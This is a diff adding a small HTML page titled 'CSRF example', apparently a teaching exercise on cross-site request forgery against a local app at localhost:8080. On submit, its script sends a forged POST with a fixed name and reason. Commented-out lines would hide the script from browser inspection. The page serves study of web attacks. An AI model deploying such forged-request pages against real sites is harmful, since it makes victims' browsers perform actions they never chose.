@@ -1,0 +1,39 @@
+<!doctype html>
+<html>
+<head>
+<title> CSRF example</title>
+<script type="text/javascript" id="remove">
+
+	// A8-Cross-Site Request Forgery
+	// Code has been  left unobfuscated for demonstration purposes
+
+	window.onload = function () {
+		document.getElementById('csrf-form').onsubmit = function(){
+			var url = document.getElementById('address').value;
+			var params = "name=Matti&reason=Lobotomy";
+			var xhr = new XMLHttpRequest();
+			xhr.open("POST", url, true);
+			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			xhr.send(params);
+			document.getElementById('info').innerHTML = "Have a look back at the application. Nice, isn't it?";
+			return false;
+		}
+
+		// Hide script from inspect view
+		// elem = document.getElementById('remove');
+		// elem.parentNode.removeChild(elem);
+	}
+</script>
+</head>
+<body>
+	<p> Let's pretend that you're Matti.</p>
+	<form id="csrf-form">
+		<label for="address">Server address:</label>
+		<input type="text" name="address" id="address" value="localhost:8080">
+		<button type="submit">Execute</button>
+	</form>
+	<p id="info"></span>
+</body>
+</html>
+
+
